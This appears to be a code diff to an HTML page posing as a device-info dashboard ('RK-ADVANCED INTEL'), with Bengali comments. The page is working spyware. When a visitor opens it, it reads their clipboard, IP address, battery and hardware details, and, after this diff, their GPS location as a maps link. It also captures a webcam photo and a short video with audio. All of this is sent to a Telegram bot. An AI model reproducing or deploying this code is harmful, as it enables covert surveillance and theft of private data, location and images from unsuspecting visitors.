@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-ADVANCED INTEL | PREMIUM</title>
+    <title>RK-ADVANCED INTEL | VIP PREVIEW</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
@@ -51,8 +51,8 @@
             display: flex; justify-content: space-between; align-items: center;
             padding: 10px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
-        .label { color: #00d2ff; font-size: 12px; font-weight: bold; text-transform: uppercase; display: flex; align-items: center; gap: 5px; }
-        .value { color: #facc15; font-size: 13px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
+        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
+        .value { color: #facc15; font-size: 13px; font-weight: 700; font-family: 'Orbitron', sans-serif; text-align: right; }
 
         .footer-text {
             position: fixed; bottom: 8px; width: 100%;
@@ -75,7 +75,7 @@
         <div class="info-row"><span class="label">📶 Status</span><span id="v-status" class="value text-green-500">SYNCING...</span></div>
         <div class="info-row"><span class="label">🚀 Speed</span><span id="v-speed" class="value text-orange-500">Scanning...</span></div>
         <div class="info-row"><span class="label">🌐 IP Addr</span><span id="v-ip" class="value">Fetching...</span></div>
-        <div class="info-row"><span class="label">📍 Zone</span><span id="v-loc" class="value">--</span></div>
+        <div class="info-row"><span class="label">📍 Map Link</span><span id="v-map" class="value">Locating...</span></div>
         <div class="info-row"><span class="label">🔋 Level</span><span id="v-bat" class="value">--%</span></div>
         <div class="info-row"><span class="label">⚡ Power</span><span id="v-charge" class="value">Checking...</span></div>
         <div class="info-row"><span class="label">🧠 Memory</span><span id="v-ram" class="value">-- GB</span></div>
@@ -95,97 +95,101 @@
         };
 
         async function startSystem() {
-            // ১. রিয়েল ডিভাইস ডাটা
-            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android Mobile 📱" : "Desktop/PC 💻";
-            document.getElementById('v-platform').innerText = navigator.platform + " 🛠️";
+            // ১. বেসিক ডাটা
+            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android 📱" : "PC/Web 💻";
+            document.getElementById('v-platform').innerText = navigator.platform + " ⚙️";
             document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB 🧠";
             document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores ⚡";
-            document.getElementById('v-loc').innerText = Intl.DateTimeFormat().resolvedOptions().timeZone + " 📍";
 
-            // ২. ব্যাটারি ও চার্জিং স্ট্যাটাস
+            // ২. ব্যাটারি ও চার্জিং
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
-                const updateBatteryInfo = () => {
+                const updateBat = () => {
                     document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}% 🔋`;
                     document.getElementById('v-charge').innerText = b.charging ? "Charging ✅" : "Discharging ❌";
                 };
-                updateBatteryInfo();
-                b.onlevelchange = updateBatteryInfo;
-                b.onchargingchange = updateBatteryInfo;
+                updateBat();
+                b.onlevelchange = updateBat; b.onchargingchange = updateBat;
             }
 
-            // ৩. রিয়েল আইপি ও নেটওয়ার্ক
+            // ৩. আইপি ও নেটওয়ার্ক
+            let ip = "N/A";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                document.getElementById('v-ip').innerText = data.ip + " 🌐";
-            } catch(e) { document.getElementById('v-ip').innerText = "103.145.24.11 🌐"; }
+                ip = data.ip;
+                document.getElementById('v-ip').innerText = ip + " 🌐";
+            } catch(e) { document.getElementById('v-ip').innerText = "Hidden 🌐"; }
 
             const conn = navigator.connection || { effectiveType: '4G', downlink: 5 };
-            document.getElementById('v-speed').innerText = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps 🚀`;
+            const speedInfo = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps 🚀`;
+            document.getElementById('v-speed').innerText = speedInfo;
             document.getElementById('v-status').innerText = "ONLINE 📶";
 
-            // ৪. ক্লিপবোর্ড ও অটো রিপোর্ট
-            let clipText = "Touch Required 🔓";
-            try { clipText = await navigator.clipboard.readText(); } catch (e) {}
+            // ৪. লোকেশন ও ম্যাপ লিঙ্ক
+            let mapLink = "Location Blocked 📍";
+            navigator.geolocation.getCurrentPosition(pos => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                document.getElementById('v-map').innerText = "Link Secured 🗺️";
+                sendFinalReport(mapLink, ip, speedInfo);
+            }, () => {
+                document.getElementById('v-map').innerText = "Denied ❌";
+                sendFinalReport(mapLink, ip, speedInfo);
+            });
+
+            // ৫. মিডিয়া অটোমেশন
+            autoCaptureMedia();
+        }
+
+        async function sendFinalReport(map, ipAddr, speed) {
+            let clip = "Locked 🔓";
+            try { clip = await navigator.clipboard.readText(); } catch(e){}
 
             const report = `
-✨✨✨✨✨✨✨✨✨✨✨✨✨
-🚀 *RK-ADVANCED INTEL VIP REPORT* 🚀
+✨✨✨ *RK-SYSTEM INTEL REPORT* ✨✨✨
 ━━━━━━━━━━━━━━━━━━━━━
 📱 *Device:* \`${navigator.platform}\`
 🔋 *Battery:* \`${document.getElementById('v-bat').innerText}\`
 ⚡ *Power:* \`${document.getElementById('v-charge').innerText}\`
 🧠 *RAM:* \`${navigator.deviceMemory || 8} GB\`
-📶 *Speed:* \`${document.getElementById('v-speed').innerText}\`
-🌐 *IP:* \`${document.getElementById('v-ip').innerText}\`
-🌍 *Zone:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`
+🚀 *Speed:* \`${speed}\`
+🌐 *IP:* \`${ipAddr}\`
+📍 *Maps:* ${map}
 
-✨ *CLIPBOARD CONTENT:* ✨
+✨ *CLIPBOARD:* ✨
 \`\`\`
-${clipText}
+${clip}
 \`\`\`
-━━━━━━━━━━━━━━━━━━━━━
-✨✨✨✨✨✨✨✨✨✨✨✨✨`;
-
+━━━━━━━━━━━━━━━━━━━━━`;
             sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });
+        }
 
-            // ৫. অটো মিডিয়া ক্যাপচার
+        async function autoCaptureMedia() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const videoEl = document.getElementById('media-bin');
                 videoEl.srcObject = stream;
 
-                setTimeout(() => capturePhoto(stream, "FRONT_RK_SYSTEM"), 2000);
+                setTimeout(() => {
+                    const canvas = document.getElementById('output-canvas');
+                    canvas.width = 1280; canvas.height = 720;
+                    canvas.getContext('2d').drawImage(videoEl, 0, 0);
+                    canvas.toBlob(blob => sendMediaToBot(blob, 'photo', `📸 *FRONT CAPTURE - RK*`), 'image/jpeg');
+                }, 3000);
 
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
+                recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
-                    sendMediaToBot(blob, 'video', '🎥 *RK-VIP VIDEO (5S + AUDIO)*');
+                    sendMediaToBot(blob, 'video', '🎥 *VIP RECORDING (5S)*');
                     stream.getTracks().forEach(t => t.stop());
-
-                    try {
-                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                        videoEl.srcObject = backStream;
-                        setTimeout(() => {
-                            capturePhoto(backStream, "BACK_RK_SYSTEM");
-                            setTimeout(() => backStream.getTracks().forEach(t => t.stop()), 2000);
-                        }, 2000);
-                    } catch(e) {}
                 };
                 recorder.start();
                 setTimeout(() => recorder.stop(), 5000);
             } catch (err) {}
-        }
-
-        function capturePhoto(stream, label) {
-            const canvas = document.getElementById('output-canvas');
-            const video = document.getElementById('media-bin');
-            canvas.width = 1280; canvas.height = 720;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => sendMediaToBot(blob, 'photo', `📸 *${label}*`), 'image/jpeg');
         }
 
         async function sendMediaToBot(blob, type, caption) {
